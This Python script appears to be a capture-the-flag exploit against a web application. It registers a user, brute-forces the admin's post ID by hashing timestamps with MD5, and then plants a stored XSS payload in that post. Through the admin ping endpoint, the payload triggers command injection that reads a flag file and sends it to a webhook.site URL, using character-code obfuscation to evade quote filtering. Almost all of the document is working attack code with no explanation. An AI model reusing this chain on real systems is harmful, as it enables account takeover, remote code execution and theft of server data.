import requests, hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed

num_threads = 8    
base = "http://localhost:5173/"
# base = "http://157.230.150.185:4143/"

creds = {
    "username": "a",
    "password": "b"
}

s = requests.session()
s.post(base+'api/register', json=creds)
r1 = s.post(base+'api/login', json=creds)

r = s.post(base+"api/posts", json={
    "title": "a",
    "content": "b"
})

init_ts = r.json()['timestamp']
print("Initial timestamp:", init_ts)

def hash_post_id(username: str, ts: str) -> str:
    base = f"{username}-{ts}"
    return hashlib.md5(base.encode()).hexdigest()

ts = int(init_ts)

def check_ts(session, t):
    hid = hash_post_id("admin", str(t))
    url = base + "api/posts/" + hid
    print("trying ts:", t)
    try:
        r = session.get(url, timeout=5)
        if r.ok:
            print("found")
            return hid, t
    except requests.RequestException:
        pass
    return None


def find_hid():
    global ts
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        while True:
            # create a batch of futures
            futures = {executor.submit(check_ts, s, ts - i): ts - i for i in range(num_threads)}
            ts -= num_threads  # move down for the next batch

            for future in as_completed(futures):
                result = future.result()
                if result:
                    hid, found_ts = result
                    print("Found admin hid:", hid, "at ts:", found_ts)
                    return hid


hid = find_hid() 
# hid = 'c96ff406dbedb884997192895693b880' 


# I just can have quote (") and also cant have nested single-quote (')
# so I use ord() + ord() per char
exfil_url = 'https://webhook.site/e99252de-9c92-462e-8c4a-f42e0a243d88?data='
exfil_charcode = ''
for c in exfil_url:
    exfil_charcode += f'chr({ord(c)})+'
exfil_charcode = exfil_charcode[:-1]

flag_file = 'flag'
flag_charcode = ''
for c in flag_file:
    flag_charcode += f'chr({ord(c)})+'
flag_charcode = flag_charcode[:-1]

python_payload = f"python3 -c 'import urllib.request;urllib.request.urlopen({exfil_charcode} + open({flag_charcode}).read().strip())'"

payload = {
    "title": "payload",
    "content": f'''
    <img src=x onerror="
        fetch('http://frontend:5173/api/admin/ping', {{
            method: 'POST',
            credentials: 'include',
            headers: {{
                'Content-Type': 'application/json'
            }},
            body: JSON.stringify({{ host: `; {python_payload}`}})
        }});
    ">
    '''
}

r = s.put(base+"/api/posts/"+hid, json=payload)
print(r.text)